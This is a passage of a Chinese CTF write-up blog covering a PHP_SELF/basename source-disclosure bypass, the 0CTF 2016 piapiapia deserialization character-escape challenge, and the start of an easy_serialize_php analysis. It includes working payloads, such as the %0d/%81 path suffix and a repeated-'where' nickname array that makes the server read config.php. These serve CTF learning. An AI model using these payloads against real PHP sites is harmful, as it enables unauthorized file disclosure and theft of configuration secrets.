class="hljs-string">&quot;hacker :)&quot;</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">&#x27;show_source&#x27;</span>])) &#123;<br>    highlight_file(basename($_SERVER[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>]));<br>    <span class="hljs-keyword">exit</span>();<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    show_source(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span> <br></code></pre></td></tr></table></figure>

<p>开头就讲明包含了utils.php</p>
<p>接着POST传参，涉及到好多过滤</p>
<p>采用Y1ng大佬思路：<a href="https://www.gem-love.com/ctf/1898.html">🇯🇵zer0pts CTF 2020 Writeup – 颖奇L’Amore (gem-love.com)</a></p>
<figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk"><span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&#x27;/utils\.php\/*$/i&#x27;</span>, <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">exit</span>(<span class="hljs-string">&quot;hacker :)&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>正则的匹配 ban 掉了 config.php。然后会 <code>highlight_file()</code>：</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk"><span class="hljs-keyword">if</span> (isset(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;show_source&#x27;</span>])) &#123;<br>    highlight_file(basename(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;PHP_SELF&#x27;</span>]));<br>    <span class="hljs-keyword">exit</span>();<br></code></pre></td></tr></table></figure>

<p>可以发现这里加上了 <code>basename()</code> 可能是为了跨目录读文件，而问题正好出在了这里，</p>
<p>演示：</p>
<p><img src="/2021/10/10/2021/ctf/%E9%B9%A4%E5%9F%8E%E6%9D%AF/image-20211012193624036.png" alt="image-20211012193624036"></p>
<p>可以看到被挡了，但至少说明我们思路正确</p>
<p>当我访问 index.php 时，我可以在后面加上一些东西，比如 /index.php/utils.php，这样仍然访问的是 index.php，但经过 <code>basename()</code> 后，传进 <code>highlight_file()</code> 函数的文件名就变成了 utils.php，如果能绕过那个正则，就可以得到 utils.php 源码了，而题目告诉 FLAG 就在 config.php 里，这道题就做完了。</p>
<p>可以发现，这个正则匹配了 utils.php/ 为 <code>$_SERVER[&#39;PHP_SELF&#39;]</code> 的结尾</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk">utils\.php\<span class="hljs-regexp">/*$/i</span><br></code></pre></td></tr></table></figure>

<p>老套路了，可以用 %0d 之类的来污染绕过，这样仍然访问得到 index.php:</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/index.php/u</span>tils.php%<span class="hljs-number">0</span>d<br></code></pre></td></tr></table></figure>

<p>然后看了大佬的wp，直接打？</p>
<p><img src="/2021/10/10/2021/ctf/%E9%B9%A4%E5%9F%8E%E6%9D%AF/image-20211012194757043.png" alt="image-20211012194757043"></p>
<p>我对这个%81不是很理解，在本地试了一下</p>
<p><img src="/2021/10/10/2021/ctf/%E9%B9%A4%E5%9F%8E%E6%9D%AF/image-20211012194837502.png" alt="image-20211012194837502"></p>
<p>这个符号？？？</p>
<p>不过还真的一打就成，可是原理我不太懂啊</p>
<p><img src="/2021/10/10/2021/ctf/%E9%B9%A4%E5%9F%8E%E6%9D%AF/image-20211012194930406.png" alt="image-20211012194930406"></p>
<p>还得问问大佬</p>
]]></content>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>0CTF 2016 piapiapia</title>
    <url>/2021/08/17/2021/buu/12/</url>
    <content><![CDATA[<h4 id="0x00知识点"><a href="#0x00知识点" class="headerlink" title="0x00知识点"></a>0x00知识点</h4><ul>
<li><h5 id="信息泄露"><a href="#信息泄露" class="headerlink" title="信息泄露"></a>信息泄露</h5></li>
<li><h5 id="参数传递数组绕过字符串检测"><a href="#参数传递数组绕过字符串检测" class="headerlink" title="参数传递数组绕过字符串检测"></a>参数传递数组绕过字符串检测</h5></li>
<li><h5 id="反序列化字符逃逸"><a href="#反序列化字符逃逸" class="headerlink" title="反序列化字符逃逸"></a>反序列化字符逃逸</h5><h5 id="参考博客"><a href="#参考博客" class="headerlink" title="参考博客"></a>参考博客</h5><p><a href="https://www.cnblogs.com/g0udan/p/12216207.html">0CTF 2016]piapiapia解题详细思路及复现 - g0udan - 博客园 (cnblogs.com)</a></p>
</li>
</ul>
<h4 id="0x01解题"><a href="#0x01解题" class="headerlink" title="0x01解题"></a>0x01解题<img src="/2021/08/17/2021/buu/12/image-20210817200805927.png" alt="image-20210817200805927"></h4><p>进来是一个登录页面，很难登录，且也不是什么sql注入</p>
<p>f12无发现</p>
<p>这时候请出dirsearch(记得调低线程，不然会漏掉<a href="http://www.zip/">www.zip</a>)</p>
<p><img src="/2021/08/17/2021/buu/12/image-20210817201129087.png" alt="image-20210817201129087"></p>
<p>通过后台扫描我们有了register页面，也就是注册页面</p>
<p>还有<a href="http://www.zip,config.php,update.php,这些我们后面都要用到./">www.zip,config.php,update.php,这些我们后面都要用到。</a></p>
<p><img src="/2021/08/17/2021/buu/12/image-20210817204317100.png" alt="image-20210817204317100"></p>
<p>注册后登录</p>
<p><img src="/2021/08/17/2021/buu/12/image-20210817201432160.png" alt="image-20210817201432160"></p>
<p><img src="/2021/08/17/2021/buu/12/image-20210817201501824.png" alt="image-20210817201501824"></p>
<p>进入到updat.php,提示我们上传文件，本来我还以为是传图片马</p>
<p>结果本题核心不是，是前面扫出的<a href="http://www.zip源码提示了绕过/">www.zip源码提示了绕过</a></p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php">&lt; ?php<br><span class="hljs-keyword">require_once</span>(<span class="hljs-string">&#x27;class.php&#x27;</span>);<br><span class="hljs-keyword">if</span> ($_SESSION[<span class="hljs-string">&#x27;username&#x27;</span>] == <span class="hljs-literal">null</span>) &#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Login First&#x27;</span>);<br>&#125;<br><span class="hljs-keyword">if</span> ($_POST[<span class="hljs-string">&#x27;phone&#x27;</span>] &amp; &amp; $_POST[<span class="hljs-string">&#x27;email&#x27;</span>] &amp; &amp; $_POST[<span class="hljs-string">&#x27;nickname&#x27;</span>] &amp; &amp; $_FILES[<span class="hljs-string">&#x27;photo&#x27;</span>]) &#123;<br><br>$username = $_SESSION[<span class="hljs-string">&#x27;username&#x27;</span>];<br><span class="hljs-keyword">if</span> (!preg_match(<span class="hljs-string">&#x27;/^\d&#123;11&#125;$/&#x27;</span>, $_POST[<span class="hljs-string">&#x27;phone&#x27;</span>]))<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Invalid phone&#x27;</span>);<br><br><span class="hljs-keyword">if</span> (!preg_match(<span class="hljs-string">&#x27;/^[_a-zA-Z0-9]&#123;1,10&#125;@[_a-zA-Z0-9]&#123;1,10&#125;\.[_a-zA-Z0-9]&#123;1,10&#125;$/&#x27;</span>, $_POST[<span class="hljs-string">&#x27;email&#x27;</span>]))<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Invalid email&#x27;</span>);<br><br><span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&#x27;/[^a-zA-Z0-9_]/&#x27;</span>, $_POST[<span class="hljs-string">&#x27;nickname&#x27;</span>]) | | strlen($_POST[<span class="hljs-string">&#x27;nickname&#x27;</span>]) &gt; <span class="hljs-number">10</span>)<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Invalid nickname&#x27;</span>);<br><br>$file = $_FILES[<span class="hljs-string">&#x27;photo&#x27;</span>];<br><span class="hljs-keyword">if</span> ($file[<span class="hljs-string">&#x27;size&#x27;</span>] &lt; <span class="hljs-number">5</span> <span class="hljs-keyword">or</span> $file[<span class="hljs-string">&#x27;size&#x27;</span>] &gt; <span class="hljs-number">1000000</span>)<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Photo size error&#x27;</span>);<br><br>move_uploaded_file($file[<span class="hljs-string">&#x27;tmp_name&#x27;</span>], <span class="hljs-string">&#x27;upload/&#x27;</span>.md5($file[<span class="hljs-string">&#x27;name&#x27;</span>]));<br>$profile[<span class="hljs-string">&#x27;phone&#x27;</span>] = $_POST[<span class="hljs-string">&#x27;phone&#x27;</span>];<br>$profile[<span class="hljs-string">&#x27;email&#x27;</span>] = $_POST[<span class="hljs-string">&#x27;email&#x27;</span>];<br>$profile[<span class="hljs-string">&#x27;nickname&#x27;</span>] = $_POST[<span class="hljs-string">&#x27;nickname&#x27;</span>];<br>$profile[<span class="hljs-string">&#x27;photo&#x27;</span>] = <span class="hljs-string">&#x27;upload/&#x27;</span>.md5($file[<span class="hljs-string">&#x27;name&#x27;</span>]);<br><br>$user-&gt;update_profile($username, serialize($profile));<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;Update Profile Success!&lt;a href=&quot;profile.php&quot;&gt;Your Profile&lt;/a&gt;&#x27;</span>;<br>&#125;<br><span class="hljs-keyword">else</span> &#123;<br>? &gt;<br></code></pre></td></tr></table></figure>

<p>代码分析：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">require_once</span>(<span class="hljs-string">&#x27;class.php&#x27;</span>);<br><span class="hljs-keyword">if</span> ($_SESSION[<span class="hljs-string">&#x27;username&#x27;</span>] == <span class="hljs-literal">null</span>) &#123;<br><span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;Login First&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>这里我们已经登录了，非常容易地就满足了。</p>
<figure class="highlight nginx"><table><tr><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">if</span> (<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;phone&#x27;</span>] &amp; &amp; <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;email&#x27;</span>] &amp; &amp; <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;nickname&#x27;</span>] &amp; &amp; <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;photo&#x27;</span>]) &#123;<br></code></pre></td></tr></table></figure>

<p>几个变量值都为POST传参</p>
<figure class="highlight lisp"><table><tr><td class="code"><pre><code class="hljs lisp">if (!preg_match(&#x27;/^\d&#123;<span class="hljs-number">11</span>&#125;$/&#x27;, $_POST[&#x27;phone&#x27;]))<br>die(&#x27;Invalid phone&#x27;)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure>

<p>正则表达式判断是否为11位的数字电话号码</p>
<figure class="highlight lisp"><table><tr><td class="code"><pre><code class="hljs lisp">if (<span class="hljs-name">preg_match</span>(&#x27;/[^a-zA-Z0-9_]/&#x27;, $_POST[&#x27;nickname&#x27;]) | | strlen($_POST[&#x27;nickname&#x27;]) &gt; <span class="hljs-number">10</span>)<br>die(&#x27;Invalid nickname&#x27;)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure>

<p>这里判断了nickname是否为字符还有长度是否超过10</p>
<p>用文章开头的知识点二，如果我们传入的nickname是一个数组</p>
<p>绕过长度的限制，则可以绕过这正则表达式，使得我们不会die出。</p>
<figure class="highlight elixir"><table><tr><td class="code"><pre><code class="hljs elixir"><span class="hljs-variable">$user</span>-&gt;update_profile(<span class="hljs-variable">$username</span>, serialize(<span class="hljs-variable">$profile</span>));<br></code></pre></td></tr></table></figure>

<h5 id="照搬大佬思路："><a href="#照搬大佬思路：" class="headerlink" title=" 照搬大佬思路："></a> 照搬大佬思路：</h5><p>在代码的后面调用update_profile处我们想到这个可能是将数据保存到数据库，而且还用了php序列化serialize()，我们可以大胆的尝试用反序列化漏洞来搞一下。</p>
<p> 我们再看看update_profile()到底是个啥，使用全局搜索我们在class.php中看到了定义的update_profile()方法</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">update_profile</span>(<span class="hljs-params">$username, $new_profile</span>) </span>&#123;<br>	$username = <span class="hljs-built_in">parent</span>::filter($username);<br>	$new_profile = <span class="hljs-built_in">parent</span>::filter($new_profile);<br><br>	$where = <span class="hljs-string">&quot;username = &#x27;<span class="hljs-subst">$username</span>&#x27;&quot;</span>;<br>	<span class="hljs-keyword">return</span> <span class="hljs-built_in">parent</span>::update(<span class="hljs-keyword">$this</span>-&gt;table, <span class="hljs-string">&#x27;profile&#x27;</span>, $new_profile, $where);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>  我们再继续追寻下去<br>filter()</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params">$string</span>) </span>&#123;<br>	$escape = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;\&#x27;&#x27;</span>, <span class="hljs-string">&#x27;\\\\&#x27;</span>);<br>	$escape = <span class="hljs-string">&#x27;/&#x27;</span> . implode(<span class="hljs-string">&#x27;|&#x27;</span>, $escape) . <span class="hljs-string">&#x27;/&#x27;</span>;<br>	$string = preg_replace($escape, <span class="hljs-string">&#x27;_&#x27;</span>, $string);<br><br>	$safe = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;select&#x27;</span>, <span class="hljs-string">&#x27;insert&#x27;</span>, <span class="hljs-string">&#x27;update&#x27;</span>, <span class="hljs-string">&#x27;delete&#x27;</span>, <span class="hljs-string">&#x27;where&#x27;</span>);<br>	$safe = <span class="hljs-string">&#x27;/&#x27;</span> . implode(<span class="hljs-string">&#x27;|&#x27;</span>, $safe) . <span class="hljs-string">&#x27;/i&#x27;</span>;<br>	<span class="hljs-keyword">return</span> preg_replace($safe, <span class="hljs-string">&#x27;hacker&#x27;</span>, $string);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>update()</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">update</span>(<span class="hljs-params">$table, $key, $value, $where</span>) </span>&#123;<br>	$sql = <span class="hljs-string">&quot;UPDATE <span class="hljs-subst">$table</span> SET <span class="hljs-subst">$key</span> = &#x27;<span class="hljs-subst">$value</span>&#x27; WHERE <span class="hljs-subst">$where</span>&quot;</span>;<br>	<span class="hljs-keyword">return</span> mysql_query($sql);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>  update.php我们基本上就搞清楚了，是先经过正则表达式将用户提交的参数值过滤，然后序列化，然后将非法的值替换为’hacker’</p>
<h5 id="反序列化字符逃逸知识补充"><a href="#反序列化字符逃逸知识补充" class="headerlink" title="反序列化字符逃逸知识补充"></a>反序列化字符逃逸知识补充</h5><ul>
<li>PHP反序列化字符逃逸<br>举个小例子<br>序列化</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>$a = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;123&#x27;</span>, <span class="hljs-string">&#x27;abc&#x27;</span>, <span class="hljs-string">&#x27;defg&#x27;</span>);<br>var_dump(serialize($a));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>结果</p>
<figure class="highlight css"><table><tr><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">string</span>(49) &quot;<span class="hljs-selector-tag">a</span><span class="hljs-selector-pseudo">:3</span>:&#123;<span class="hljs-attribute">i</span>:<span class="hljs-number">0</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;123&quot;</span>;<span class="hljs-attribute">i</span>:<span class="hljs-number">1</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;abc&quot;</span>;<span class="hljs-attribute">i</span>:<span class="hljs-number">2</span>;<span class="hljs-attribute">s</span>:<span class="hljs-number">4</span>:<span class="hljs-string">&quot;defg&quot;</span>;&#125;&quot; <br></code></pre></td></tr></table></figure>

<p>反序列化</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//$a = array(&#x27;123&#x27;, &#x27;abc&#x27;, &#x27;defg&#x27;);</span><br><span class="hljs-comment">//var_dump(serialize($a));</span><br><span class="hljs-comment">//&quot;a:3:&#123;i:0;s:3:&quot;123&quot;;i:1;s:3:&quot;abc&quot;;i:2;s:4:&quot;defg&quot;;&#125;&quot;</span><br>$b = <span class="hljs-string">&#x27;a:3:&#123;i:0;s:3:&quot;123&quot;;i:1;s:3:&quot;abc&quot;;i:2;s:4:&quot;defg&quot;;&#125;&#x27;</span>;<br>var_dump(unserialize($b));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>运行结果</p>
<figure class="highlight lsl"><table><tr><td class="code"><pre><code class="hljs lsl">array(<span class="hljs-number">3</span>) &#123; [<span class="hljs-number">0</span>]=&gt; <span class="hljs-type">string</span>(<span class="hljs-number">3</span>) <span class="hljs-string">&quot;123&quot;</span> [<span class="hljs-number">1</span>]=&gt; <span class="hljs-type">string</span>(<span class="hljs-number">3</span>) <span class="hljs-string">&quot;abc&quot;</span> [<span class="hljs-number">2</span>]=&gt; <span class="hljs-type">string</span>(<span class="hljs-number">4</span>) <span class="hljs-string">&quot;defg&quot;</span> &#125; <br></code></pre></td></tr></table></figure>

<p>  我们可以看到在后端中，反序列化是一”;}结束的，如果我们把”;}带入需要反序列化的字符串中（除了结尾处），是不是就能让反序列化提前结束后面的内容就丢弃了呢？<br>  我们把第二个值abc换成abc”;i:2;s:5:”qwert”;}</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//$a = array(&#x27;123&#x27;, &#x27;abc&#x27;, &#x27;defg&#x27;);</span><br><span class="hljs-comment">//var_dump(serialize($a));</span><br><span class="hljs-comment">//&quot;a:3:&#123;i:0;s:3:&quot;123&quot;;i:1;s:3:&quot;abc&quot;;i:2;s:4:&quot;defg&quot;;&#125;&quot;</span><br>$b = <span class="hljs-string">&#x27;a:3:&#123;i:0;s:3:&quot;123&quot;;i:1;s:3:&quot;abc&quot;;i:2;s:5:&quot;qwert&quot;;&#125;&quot;;i:2;s:4:&quot;defg&quot;;&#125;&#x27;</span>;<br>var_dump(unserialize($b));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>运行结果</p>
<figure class="highlight lsl"><table><tr><td class="code"><pre><code class="hljs lsl">array(<span class="hljs-number">3</span>) &#123; [<span class="hljs-number">0</span>]=&gt; <span class="hljs-type">string</span>(<span class="hljs-number">3</span>) <span class="hljs-string">&quot;123&quot;</span> [<span class="hljs-number">1</span>]=&gt; <span class="hljs-type">string</span>(<span class="hljs-number">3</span>) <span class="hljs-string">&quot;abc&quot;</span> [<span class="hljs-number">2</span>]=&gt; <span class="hljs-type">string</span>(<span class="hljs-number">5</span>) <span class="hljs-string">&quot;qwert&quot;</span> &#125; <br></code></pre></td></tr></table></figure>

<p>成功的反序列化出我们自己定义的内容，丢弃了原先的内容（i:2;s:4:”defg”）<br>反序列化字符逃逸就先介绍到这里，我们回过头来看一下题</p>
<ul>
<li>突破口<br>我们发现一个问题，我们反序列化字符逃逸，首先序列化的字符是可控的，还有前面的长度是可控的。但update.php将参数序列化，我们可控变量的长度就已经写死了，怎么才能去控制呢。这道题的突破口其实就是序列化过后数据过滤替换那里，看似更加安全，其实更加危险。</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//过滤函数</span><br>	<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params">$string</span>) </span>&#123;<br>		$escape = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;\&#x27;&#x27;</span>, <span class="hljs-string">&#x27;\\\\&#x27;</span>);<br>		$escape = <span class="hljs-string">&#x27;/&#x27;</span> . implode(<span class="hljs-string">&#x27;|&#x27;</span>, $escape) . <span class="hljs-string">&#x27;/&#x27;</span>;<br>		$string = preg_replace($escape, <span class="hljs-string">&#x27;_&#x27;</span>, $string);<br><br>		$safe = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;select&#x27;</span>, <span class="hljs-string">&#x27;insert&#x27;</span>, <span class="hljs-string">&#x27;update&#x27;</span>, <span class="hljs-string">&#x27;delete&#x27;</span>, <span class="hljs-string">&#x27;where&#x27;</span>);<br>		$safe = <span class="hljs-string">&#x27;/&#x27;</span> . implode(<span class="hljs-string">&#x27;|&#x27;</span>, $safe) . <span class="hljs-string">&#x27;/i&#x27;</span>;<br>		<span class="hljs-keyword">return</span> preg_replace($safe, <span class="hljs-string">&#x27;hacker&#x27;</span>, $string);<br>	&#125;<br></code></pre></td></tr></table></figure>

<p>  这里是将’select’, ‘insert’, ‘update’, ‘delete’, ‘where’替换成’hacker’，我们写入where替换成hacker之后字符串实际的长度就+1，因此实际的长度大于序列化固定的长度（变量前面‘s’里的值）。利用反序列化字符串逃逸，反序列化时只能将字符串中nickname前面的s后面长度的字符串反序列化成功，这个是传参的时候就固定好了。剩下的字符串我们构造成class.php因为里面包含了flag，并且让他在photo位置上，然后把photo给扔掉，这样在profile.php中读取的photo就是我们构造的config.php了，也就是读取到了flag<br>  简单说就是利用后端的函数替换，导致实际长度增加，增加的部分（config.php）被挤了出来，到了photo的位置上，然后闭合。<br>  再举个例方便大家理解</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//$a = array(&#x27;123&#x27;, &#x27;abc&#x27;, &#x27;defg&#x27;);</span><br><span class="hljs-comment">//var_dump(serialize($a));</span><br><span class="hljs-comment">//&quot;a:3:&#123;i:0;s:3:&quot;123&quot;;i:1;s:3:&quot;abc&quot;;i:2;s:4:&quot;defg&quot;;&#125;&quot;</span><br>$a = <span class="hljs-string">&#x27;a:3:&#123;i:0;s:3:&quot;123&quot;;i:1;s:3:&quot;abc&quot;;i:2;s:4:&quot;defg&quot;;&#125;&#x27;</span>;<br>$b = <span class="hljs-string">&#x27;a:3:&#123;i:0;s:3:&quot;123&quot;;i:1;s:3:&quot;abc&quot;;i:2;s:5:&quot;qwert&quot;;&#125;&quot;;i:2;s:4:&quot;defg&quot;;&#125;&#x27;</span>;<br>var_dump(unserialize($b));<br>var_dump(unserialize($b));<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>

<p>abc前面的s:3:不变，因为是序列化的时候固定了<br>我们将abc构造成：abc”;i:2;s:5:”qwert”;}我们再最后构造了一个闭合，导致defg被丢弃，qwert占用了defg原本的位置<br>  还是回到这一道题上，我们的目的是将”;}s:5:”photo”;s:10:”config.php”;}插入序列化的字符串里面去，这个的长度为34，所以我们要挤出来34位，不然就成了nickname的值了。where会替换成hacker，长度加1，所以我们要构造34个where。然后去profile.php查看读取的内容。</p>
<h5 id="解题继续"><a href="#解题继续" class="headerlink" title="解题继续"></a>解题继续</h5><p>nickname传入，并且nickname要改成nickname[]</p>
<figure class="highlight css"><table><tr><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere</span>&quot;;&#125;<span class="hljs-selector-tag">s</span><span class="hljs-selector-pseudo">:5</span><span class="hljs-selector-pseudo">:&quot;photo&quot;</span>;<span class="hljs-selector-tag">s</span><span class="hljs-selector-pseudo">:10</span><span class="hljs-selector-pseudo">:&quot;config.php&quot;</span>;&#125;<br></code></pre></td></tr></table></figure>

<p><img src="/2021/08/17/2021/buu/12/image-20210817203900289.png" alt="image-20210817203900289"></p>
<p>上传成功，去访问profile.php</p>
<p><img src="/2021/08/17/2021/buu/12/image-20210817204106098.png" alt="image-20210817204106098"></p>
<hr>
<p><img src="/2021/08/17/2021/buu/12/image-20210817204134202.png" alt="image-20210817204134202"></p>
<p>解码一下</p>
<p><img src="/2021/08/17/2021/buu/12/image-20210817204228388.png" alt="image-20210817204228388"></p>
]]></content>
      <categories>
        <category>CTF·反序列化</category>
      </categories>
      <tags>
        <tag>buu</tag>
      </tags>
  </entry>
  <entry>
    <title>安洵杯 2019 easy_serialize_php</title>
    <url>/2021/08/19/2021/buu/14/</url>
    <content><![CDATA[<h4 id="0x00知识点"><a href="#0x00知识点" class="headerlink" title="0x00知识点"></a>0x00知识点</h4><p>[<a href="https://www.cnblogs.com/wangtanzhi/p/12261610.html">安洵杯 2019]easy_serialize_php - 王叹之 - 博客园 (cnblogs.com)</a></p>
<p>[<a href="https://www.cnblogs.com/h3zh1/p/12732336.html">安洵杯 2019]easy_serialize_php - h3zh1 - 博客园 (cnblogs.com)</a></p>
<p><a href="https://www.runoob.com/php/php-var_dump-function.html">https://www.runoob.com/php/php-var_dump-function.html</a></p>
<p><a href="https://www.w3school.com.cn/php/func_filesystem_file_get_contents.asp">https://www.w3school.com.cn/php/func_filesystem_file_get_contents.asp</a></p>
<h4 id="0x01解题"><a href="#0x01解题" class="headerlink" title="0x01解题"></a>0x01解题</h4><p><img src="/2021/08/19/2021/buu/14/image-20210819094121329.png"></p>
<p>发现了参数f</p>
<p>代码如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><code class="hljs php+HTML">&lt;?php<br><br>$function &#x3D; @$_GET[&#39;f&#39;];<br><br>function filter($img)&#123;<br>  $filter_arr &#x3D; array(&#39;php&#39;,&#39;flag&#39;,&#39;php5&#39;,&#39;php4&#39;,&#39;fl1g&#39;);<br>  $filter &#x3D; &#39;&#x2F;&#39;.implode(&#39;|&#39;,$filter_arr).&#39;&#x2F;i&#39;;<br>  return preg_replace($filter,&#39;&#39;,$img);<br>&#125;<br><br><br>if($_SESSION)&#123;<br>  unset($_SESSION);<br>&#125;<br><br>$_SESSION[&quot;user&quot;] &#x3D; &#39;guest&#39;;<br>$_SESSION[&#39;function&#39;] &#x3D; $function;<br><br>extract($_POST);<br><br>if(!$function)&#123;<br>  echo &#39;&lt;a href&#x3D;&quot;index.php?f&#x3D;highlight_file&quot;&gt;source_code&lt;&#x2F;a&gt;&#39;;<br>&#125;<br><br>if(!$_GET[&#39;img_path&#39;])&#123;<br>  $_SESSION[&#39;img&#39;] &#x3D; base64_encode(&#39;guest_img.png&#39;);<br>&#125;else&#123;<br>  $_SESSION[&#39;img&#39;] &#x3D; sha1(base64_encode($_GET[&#39;img_path&#39;]));<br>&#125;<br><br>$serialize_info &#x3D; filter(serialize($_SESSION));<br><br>if($function &#x3D;&#x3D; &#39;highlight_file&#39;)&#123;<br>  highlight_file(&#39;index.php&#39;);<br>&#125;else if($function &#x3D;&#x3D; &#39;phpinfo&#39;)&#123;<br>  eval(&#39;phpinfo();&#39;); &#x2F;&#x2F;maybe you can find something in here!<br>&#125;else if($function &#x3D;&#x3D; &#39;show_image&#39;)&#123;<br>  $userinfo &#x3D; unserialize($serialize_info);<br>  echo file_get_contents(base64_decode($userinfo[&#39;img&#39;]));<br>&#125;<br></code></pre></td></tr></table></figure>

<p>正式审计前，我注意到了题目一个很大的提示</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><code class="hljs javascript">&#125;<span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>($<span class="hljs-function"><span class="hljs-keyword">function</span> == &#x27;<span class="hljs-title">phpinfo</span>&#x27;)</span>&#123;<br>  <span class="hljs-built_in">eval</span>(<span class="hljs-string">&#x27;phpinfo();&#x27;</span>); <span class="hljs-comment">//maybe you can find something in here!</span><br></code></pre></td></tr></table></figure>

<p>顺着提示，赋值f=phpinfo进行查询。</p>
<p><img src="/2021/08/19/2021/buu/14/image-20210819094711265.png"></p>
<p>找到了d0g3_f1ag.php，猜测flag在其中</p>
<p>接下来代码审计</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params">$img</span>)</span>&#123;<br>    $filter_arr = <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;php&#x27;</span>,<span class="hljs-string">&#x27;flag&#x27;</span>,<span class="hljs-string">&#x27;php5&#x27;</span>,<span class="hljs-string">&#x27;php4&#x27;</span>,<span class="hljs-string">&#x27;fl1g&#x27;</span>);<br>    $filter = <span class="hljs-string">&#x27;/&#x27;</span>.implode(<span class="hljs-string">&#x27;|&#x27;</span>,$filter_arr).<span class="hljs-string">&#x27;/i&#x27;</span>;<br>    <span class="hljs-keyword">return</span> preg_replace($filter,<span class="hljs-string">&#x27;&#x27;</span>,$img);<br>&#125;<br><br>$serialize_info = filter(serialize($_SESSION));<br></code></pre></td></tr></table></figure>

<p>filter函数是为了过滤用的</p>
<p>过滤了很多关键字，比如php，flag，若遇到会正则替换为空</p>
<p>之后还会序列化，所以我们要反序列化操作一手</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>($_SESSION)&#123;<br>    <span class="hljs-keyword">unset</span>($_SESSION);<br>&#125;<br><br>$_SESSION[<span class="hljs-string">&quot;user&quot;</span>] = <span class="hljs-string">&#x27;guest&#x27;</span>;<br>$_SESSION[<span class="hljs-string">&#x27;function&#x27;</span>] = $function;<br><br>extract($_POST);<br></code></pre></td></tr></table></figure>

